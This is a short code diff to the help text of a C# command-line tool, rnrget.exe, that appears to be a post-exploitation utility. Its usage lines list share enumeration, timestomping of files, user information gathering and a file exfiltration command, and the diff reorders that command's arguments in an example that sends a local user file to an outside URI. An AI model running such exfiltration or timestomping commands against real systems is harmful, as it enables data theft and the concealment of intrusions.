@@ -372,7 +372,7 @@ namespace rnr
             Console.WriteLine("shares       enumerate shares            rnrget.exe shares");
             Console.WriteLine("ts           timestomp                   rnrget.exe ts <target path>, rnrget.exe ts C:\\Users\\Admin\\AppData\\Local\\Temp\\targetfile.bin");
             Console.WriteLine("userinfo     get user information        rnrget.exe userinfo");
-            Console.WriteLine("xfil         exfil files                 rnrget.exe xfil <URI> <target path>, rnrget.exe xfil https://raw.githubusercontent.com/rnranalysis/xfiol.file C:\\Users\\Admin\\xfil.me");
+            Console.WriteLine("xfil         exfil files                 rnrget.exe xfil <target path> <URI>, rnrget.exe xfil C:\\Users\\Admin\\xfil.me https://raw.githubusercontent.com/rnranalysis/xfiol.file");
             Console.WriteLine("");
         }
     }
